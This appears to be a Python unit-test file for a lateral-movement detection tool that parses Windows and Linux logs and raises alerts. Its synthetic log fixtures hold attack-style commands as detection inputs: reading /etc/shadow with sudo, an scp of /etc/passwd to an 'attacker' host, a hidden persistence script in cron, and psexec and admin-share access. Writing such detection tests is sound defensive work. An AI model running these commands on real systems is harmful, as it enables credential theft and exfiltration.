"""Unit and integration tests for Windows + Linux raw log parsing and lateral movement pipeline."""

import json
import os
import sys
import tempfile
import threading
import unittest
from http.server import ThreadingHTTPServer
from urllib.request import Request, urlopen

import pandas as pd

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from src.api.scoring_server import score_events
from src.api.web_server import JobManager, SessionState, make_web_handler
from src.config import load_config
from src.detection.merge_alerts import merge_and_score_alerts
from src.detection.ml_detection import train_and_predict_ml
from src.detection.rule_based_detection import evaluate_rules, run_rule_detection
from src.ingestion.generate_synthetic_logs import generate_raw_dataset
from src.ingestion.log_ingestion import ingest_logs
from src.ml.feature_engineering import NUMERIC_FEATURE_COLUMNS, build_features
from src.utils.evaluate import evaluate_detections
from src.utils.visualize_alerts import generate_visualizations
from run_pipeline import run_pipeline


class TestLateralMovementPipeline(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.base_cfg = load_config()
        self.cfg_path = os.path.join(self.tmp.name, "test_config.json")

        cfg = json.loads(json.dumps(self.base_cfg))
        cfg["paths"] = {
            "raw_dir": os.path.join(self.tmp.name, "raw"),
            "processed_file": os.path.join(self.tmp.name, "processed", "clean_logs.csv"),
            "ground_truth_file": os.path.join(self.tmp.name, "raw", "ground_truth_campaigns.csv"),
            "features_file": os.path.join(self.tmp.name, "features", "feature_table.csv"),
            "alerts_dir": os.path.join(self.tmp.name, "alerts"),
            "rule_alerts_file": os.path.join(self.tmp.name, "alerts", "alerts.csv"),
            "ml_alerts_file": os.path.join(self.tmp.name, "alerts", "ml_alerts.csv"),
            "all_alerts_file": os.path.join(self.tmp.name, "alerts", "all_alerts.csv"),
            "user_risk_file": os.path.join(self.tmp.name, "alerts", "user_risk_scores.csv"),
            "eval_report_file": os.path.join(self.tmp.name, "alerts", "evaluation_report.json"),
            "visualizations_dir": os.path.join(self.tmp.name, "alerts", "visualizations"),
            "models_dir": os.path.join(self.tmp.name, "models"),
        }

        os.makedirs(cfg["paths"]["raw_dir"], exist_ok=True)
        with open(self.cfg_path, "w", encoding="utf-8") as f:
            json.dump(cfg, f)
        self._prev_env = os.environ.get("ALMD_CONFIG_PATH")
        os.environ["ALMD_CONFIG_PATH"] = self.cfg_path

    def tearDown(self) -> None:
        if self._prev_env is None:
            os.environ.pop("ALMD_CONFIG_PATH", None)
        else:
            os.environ["ALMD_CONFIG_PATH"] = self._prev_env
        self.tmp.cleanup()

    def test_windows_and_linux_raw_log_parsing(self) -> None:
        cfg = load_config()
        raw_dir = cfg["paths"]["raw_dir"]

        # Windows Security, PowerShell, WinRM, RDP, System, Application
        with open(os.path.join(raw_dir, "windows_all_channels.jsonl"), "w", encoding="utf-8") as f:
            events = [
                {
                    "Channel": "Security",
                    "EventID": 4688,
                    "TimeCreated": "2025-11-16T09:05:00.000Z",
                    "Computer": "host001.corp.local",
                    "EventData": {"TargetUserName": "ali", "IpAddress": "10.0.0.5", "NewProcessName": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c net use \\\\hr01\\C$"},
                },
                {
                    "Channel": "Microsoft-Windows-PowerShell/Operational",
                    "EventID": 4104,
                    "TimeCreated": "2025-11-16T09:06:00.000Z",
                    "Computer": "host001.corp.local",
                    "EventData": {"User": "CORP\\ali", "IpAddress": "10.0.0.5", "HostApplication": "powershell.exe", "ScriptBlockText": "Invoke-Command -ComputerName hr01"},
                },
                {
                    "Channel": "Microsoft-Windows-WinRM/Operational",
                    "EventID": 6,
                    "TimeCreated": "2025-11-16T09:07:00.000Z",
                    "Computer": "hr01.corp.local",
                    "EventData": {"User": "CORP\\ali", "IpAddress": "10.0.0.5", "HostApplication": "wmic.exe", "ScriptBlockText": "wmic /node:hr01 process call create cmd.exe"},
                },
                {
                    "Channel": "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational",
                    "EventID": 1149,
                    "TimeCreated": "2025-11-16T09:08:00.000Z",
                    "Computer": "hr01.corp.local",
                    "EventData": {"Param1": "CORP\\ali", "Param3": "10.0.0.5", "SessionID": 4},
                },
                {
                    "Channel": "System",
                    "ProviderName": "Service Control Manager",
                    "EventID": 7045,
                    "TimeCreated": "2025-11-16T09:09:00.000Z",
                    "Computer": "hr01.corp.local",
                    "EventData": {"SubjectUserName": "ali", "IpAddress": "10.0.0.5", "ServiceName": "PSEXESVC", "ImagePath": "C:\\Windows\\PSEXESVC.exe"},
                },
                {
                    "Channel": "Application",
                    "ProviderName": "Application Error",
                    "EventID": 1000,
                    "TimeCreated": "2025-11-16T09:10:00.000Z",
                    "Computer": "hr01.corp.local",
                    "EventData": {"SubjectUserName": "ali", "IpAddress": "10.0.0.5", "Message": "Faulting application"},
                },
            ]
            for ev in events:
                f.write(json.dumps(ev) + "\n")

        # Linux auth.log + syslog/auditd
        with open(os.path.join(raw_dir, "linux_auth.log"), "w", encoding="utf-8") as f:
            f.write("Nov 16 09:11:00 linux-prod01 sshd[1234]: Failed password for omar from 172.16.8.99 port 51000 ssh2\n")
            f.write("2025-11-16T09:12:00Z linux-prod01 sudo[1235]: omar : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow\n")
        with open(os.path.join(raw_dir, "linux_syslog_audit.log"), "w", encoding="utf-8") as f:
            f.write("Nov 16 09:13:00 linux-prod01 systemd[1]: Started Session 400 of user omar.\n")
            f.write("Nov 16 09:14:00 linux-prod01 CRON[1236]: (omar) CMD (/tmp/.persist.sh)\n")
            f.write("Nov 16 09:15:00 linux-prod01 auditd[555]: type=EXECVE user=omar src=10.0.0.12 comm=\"scp\" cmdline=\"scp /etc/passwd attacker@172.16.8.99:/tmp/\"\n")

        cleaned = ingest_logs()
        self.assertEqual(len(cleaned), 11)
        sources = set(cleaned["log_source"].tolist())
        self.assertEqual(
            sources,
            {
                "windows_security",
                "windows_powershell",
                "windows_winrm",
                "windows_rdp",
                "windows_system",
                "windows_application",
                "linux_auth",
                "linux_syslog",
                "linux_audit",
            },
        )
        self.assertIn("psexec.exe", cleaned["process_name"].tolist())
        self.assertIn("mstsc.exe", cleaned["process_name"].tolist())
        self.assertIn("scp", cleaned["process_name"].tolist())

    def test_rule_based_null_safety_and_all_rules(self) -> None:
        cfg = load_config()
        logs = pd.DataFrame([
            {"timestamp": "2025-11-16 23:01:00", "user": "omar", "host": "host003", "event_id": 4625, "process_name": None, "command_line": None, "source_ip": "10.0.0.12"},
            {"timestamp": "2025-11-16 23:02:00", "user": "omar", "host": "host003", "event_id": 4625, "process_name": "-", "command_line": "-", "source_ip": "10.0.0.12"},
            {"timestamp": "2025-11-16 23:03:00", "user": "omar", "host": "host003", "event_id": 4625, "process_name": "-", "command_line": "-", "source_ip": "10.0.0.12"},
            {"timestamp": "2025-11-16 23:04:00", "user": "omar", "host": "host003", "event_id": 4624, "process_name": "explorer.exe", "command_line": "-", "source_ip": "10.0.0.12"},
            {"timestamp": "2025-11-16 23:06:00", "user": "omar", "host": "finance01", "event_id": 4688, "process_name": "wmic.exe", "command_line": "net use \\\\finance01\\C$", "source_ip": "10.0.0.12"},
        ])
        alerts = evaluate_rules(logs, cfg)
        alert_types = set(alerts["alert_type"].tolist())
        self.assertIn("Failed login burst before success", alert_types)
        self.assertIn("Login outside working hours", alert_types)
        self.assertIn("Multiple hosts in short time", alert_types)
        self.assertIn("Sensitive host access", alert_types)
        self.assertIn("Remote process creation", alert_types)
        self.assertIn("Admin share access", alert_types)

    def test_end_to_end_windows_linux_pipeline(self) -> None:
        cfg = load_config()
        counts = generate_raw_dataset(cfg["paths"]["raw_dir"], total_events=6000, days=15, seed=42)
        self.assertGreater(counts["ground_truth_windows"], 0)

        cleaned = ingest_logs()
        self.assertGreater(len(cleaned), 6000)

        feats = build_features()
        for col in NUMERIC_FEATURE_COLUMNS:
            self.assertIn(col, feats.columns)
        self.assertIn("is_attack", feats.columns)

        rule_df = run_rule_detection()
        self.assertGreater(len(rule_df), 0)

        ml_df = train_and_predict_ml(retrain=True)
        self.assertGreater(len(ml_df), 0)
        self.assertEqual(len(ml_df), len(train_and_predict_ml(retrain=False)))

        merged = merge_and_score_alerts(cfg)
        self.assertGreater(len(merged), 0)
        self.assertIn("alert_id", merged.columns)
        self.assertTrue(merged["alert_id"].iloc[0].startswith("ALT-"))

        report = evaluate_detections(cfg)
        self.assertEqual(report["status"], "evaluated")
        self.assertGreater(report["ensemble_at_medium_threshold"]["recall"], 0.8)

        charts = generate_visualizations()
        self.assertEqual(charts, 7)

        api_res = score_events([
            {
                "timestamp": "2025-11-16 02:15:00",
                "user": "ali",
                "host": "hr01",
                "event_id": 4688,
                "process_name": "psexec.exe",
                "command_line": "psexec \\\\hr01 cmd.exe /c dir \\\\hr01\\C$",
                "source_ip": "10.0.0.5",
            }
        ], cfg)
        self.assertGreater(len(api_res["alerts"]), 0)
        self.assertGreater(api_res["max_risk_score"], 0.0)

    def test_web_gui_server_endpoints(self) -> None:
        cfg = load_config()
        session_dir = os.path.join(self.tmp.name, "session_uploads")
        session = SessionState(session_dir)
        jobs = JobManager()

        server = ThreadingHTTPServer(("127.0.0.1", 0), make_web_handler(cfg, session=session, jobs=jobs))
        port = server.server_address[1]
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        try:
            base = f"http://127.0.0.1:{port}"
            # 1. Clean session startup: no pre-processed results
            with urlopen(f"{base}/") as r:
                self.assertEqual(r.status, 200)
                html = r.read().decode("utf-8")
                self.assertIn("AegisLM", html)
                self.assertIn("run-mode-select", html)
                self.assertIn("test_only", html)
                self.assertIn("tab-performance", html)
                self.assertIn("nav-performance", html)
            with urlopen(f"{base}/api/overview") as r:
                ov0 = json.loads(r.read().decode("utf-8"))
                self.assertFalse(ov0["has_results"])
                self.assertEqual(ov0["parsed_events_count"], 0)

            # 2. Streaming binary upload of a mixed Windows+Linux .log file
            sample_lines = "\n".join([
                json.dumps({
                    "Channel": "Security",
                    "EventID": 4624,
                    "TimeCreated": "2025-11-10T09:00:00.000Z",
                    "Computer": "host001.corp.local",
                    "EventData": {"TargetUserName": "ali", "IpAddress": "10.0.0.5", "LogonType": 2},
                }),
                json.dumps({
                    "Channel": "Security",
                    "EventID": 4688,
                    "TimeCreated": "2025-11-10T09:05:00.000Z",
                    "Computer": "host001.corp.local",
                    "EventData": {"TargetUserName": "ali", "IpAddress": "10.0.0.5", "NewProcessName": "C:\\Windows\\explorer.exe", "CommandLine": "-"},
                }),
                "Nov 10 09:10:00 linux-app01 sshd[1001]: Accepted publickey for ali from 10.0.0.5 port 51200 ssh2",
                json.dumps({
                    "Channel": "Security",
                    "EventID": 4688,
                    "TimeCreated": "2025-11-16T02:15:00.000Z",
                    "Computer": "hr01.corp.local",
                    "EventData": {"TargetUserName": "ali", "IpAddress": "10.0.0.5", "NewProcessName": "C:\\Windows\\System32\\psexec.exe", "CommandLine": "psexec \\\\hr01 cmd.exe /c net use \\\\hr01\\C$"},
                }),
                "Nov 16 02:16:00 linux-prod01 sudo[2001]: ali : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
            ]).encode("utf-8")

            up_req = Request(
                f"{base}/api/upload-raw",
                data=sample_lines,
                headers={"X-Filename": "uploaded_mixed.log", "Content-Type": "application/octet-stream"},
                method="POST",
            )
            with urlopen(up_req) as r:
                up_res = json.loads(r.read().decode("utf-8"))
                self.assertEqual(up_res["saved"], "uploaded_mixed.log")
                self.assertEqual(len(up_res["uploaded_files"]), 1)

            # Provide isolated ground truth for the test fixture inside self.tmp
            pd.DataFrame([
                {"user": "ali", "time_window": "2025-11-16 02:10:00", "attack_scenario": "test_camp", "is_attack": 1}
            ]).to_csv(cfg["paths"]["ground_truth_file"], index=False)

            # 3. Run 10-min window Train/Test split pipeline on uploaded directory
            summary = run_pipeline(raw_dir=session_dir, train_ratio=0.6, use_train_test_split=True)
            session.mark_results_ready(True)
            self.assertEqual(summary["split"]["split_mode"], "window")
            self.assertEqual(summary["split"]["train_events"], 2)
            self.assertEqual(summary["split"]["test_events"], 3)
            self.assertGreater(summary["total_merged_alerts"], 0)

            with urlopen(f"{base}/api/overview") as r:
                ov1 = json.loads(r.read().decode("utf-8"))
                self.assertTrue(ov1["has_results"])
                self.assertGreater(len(ov1["charts"]), 0)
                self.assertEqual(ov1["risk_scores"][0]["alert_id"], "ALT-0001")
            with urlopen(f"{base}/api/alerts?alert_id=ALT-0001") as r:
                al1 = json.loads(r.read().decode("utf-8"))
                self.assertGreater(len(al1["alerts"]), 0)
                self.assertTrue(all(a["alert_id"] == "ALT-0001" for a in al1["alerts"]))
            with urlopen(f"{base}/api/logs/raw?file=uploaded_mixed.log&lines=5") as r:
                raw_prev = json.loads(r.read().decode("utf-8"))
                self.assertEqual(len(raw_prev["lines"]), 5)

            # 4. Direct Test Only mode (skip Train/Test split and skip training, use saved model)
            summary_demo = run_pipeline(
                raw_dir=session_dir,
                use_train_test_split=False,
                retrain=False,
            )
            self.assertEqual(summary_demo["split"]["split_mode"], "none")
            self.assertEqual(summary_demo["split"]["total_events"], 5)
            with urlopen(f"{base}/api/overview") as r:
                ov2 = json.loads(r.read().decode("utf-8"))
                self.assertEqual(ov2["split"]["split_mode"], "none")
                self.assertEqual(ov2["parsed_events_count"], 5)

            # 5. Cumulative Model Performance History endpoint (Tab 4)
            with urlopen(f"{base}/api/model-history") as r:
                hist = json.loads(r.read().decode("utf-8"))
                self.assertEqual(hist["total_runs"], 2)
                self.assertEqual(hist["evaluated_runs"], 2)
                self.assertIsNotNone(hist["cumulative"])
                self.assertIsNotNone(hist["macro_average"])
                self.assertIn("accuracy", hist["cumulative"])
                self.assertIn("fp", hist["cumulative"])

            clr_req = Request(
                f"{base}/api/model-history/clear",
                data=b"{}",
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with urlopen(clr_req) as r:
                cleared = json.loads(r.read().decode("utf-8"))
                self.assertEqual(cleared["total_runs"], 0)
                self.assertIsNone(cleared["cumulative"])
        finally:
            server.shutdown()
            server.server_close()

    def test_ml_only_window_expands_to_individual_events(self):
        from src.api.web_server import query_alerts

        with tempfile.TemporaryDirectory() as tmp:
            os.makedirs(os.path.join(tmp, "alerts"), exist_ok=True)
            cfg = load_config()
            cfg["paths"]["processed_file"] = os.path.join(tmp, "clean_logs.csv")
            cfg["paths"]["features_file"] = os.path.join(tmp, "feature_table.csv")
            cfg["paths"]["ml_alerts_file"] = os.path.join(tmp, "alerts", "ml_alerts.csv")
            cfg["paths"]["rule_alerts_file"] = os.path.join(tmp, "alerts", "alerts.csv")
            cfg["paths"]["all_alerts_file"] = os.path.join(tmp, "alerts", "all_alerts.csv")
            cfg["paths"]["user_risk_file"] = os.path.join(tmp, "alerts", "user_risk_scores.csv")

            win = "2025-09-15 13:20:00"
            raw_rows = [
                {
                    "timestamp": f"2025-09-15 13:20:{i:02d}",
                    "user": "emp061",
                    "host": "ws-061",
                    "event_id": "4688",
                    "logon_type": "",
                    "source_ip": "10.0.1.61",
                    "process_name": "whoami.exe" if i < 10 else "net.exe",
                    "command_line": f"cmd_step_{i}",
                    "log_source": "windows",
                }
                for i in range(20)
            ]
            pd.DataFrame(raw_rows).to_csv(cfg["paths"]["processed_file"], index=False)
            pd.DataFrame([{"user": "emp061", "time_window": win, "action_count": 20}]).to_csv(
                cfg["paths"]["features_file"], index=False
            )
            pd.DataFrame([{
                "time_window": win,
                "user": "emp061",
                "host": "-",
                "alert_type": "ML anomaly",
                "details": "10m Window Anomaly: actions=20",
                "severity": 0.99,
            }]).to_csv(cfg["paths"]["ml_alerts_file"], index=False)
            pd.DataFrame(columns=["time_window", "timestamp", "user", "host", "alert_type", "details", "severity"]).to_csv(
                cfg["paths"]["rule_alerts_file"], index=False
            )

            merge_and_score_alerts(cfg)
            risk_df = pd.read_csv(cfg["paths"]["user_risk_file"])
            self.assertEqual(len(risk_df), 1)
            self.assertEqual(risk_df.loc[0, "alert_id"], "ALT-0001")
            self.assertEqual(int(risk_df.loc[0, "alert_count"]), 20)

            session = SessionState(os.path.join(tmp, "session_raw"))
            session.mark_results_ready(True)
            rows = query_alerts(cfg, session, alert_id="ALT-0001", limit=200)
            self.assertEqual(len(rows), 20)
            self.assertFalse(any(r.get("alert_type") == "ML anomaly" for r in rows))


if __name__ == "__main__":
    unittest.main()
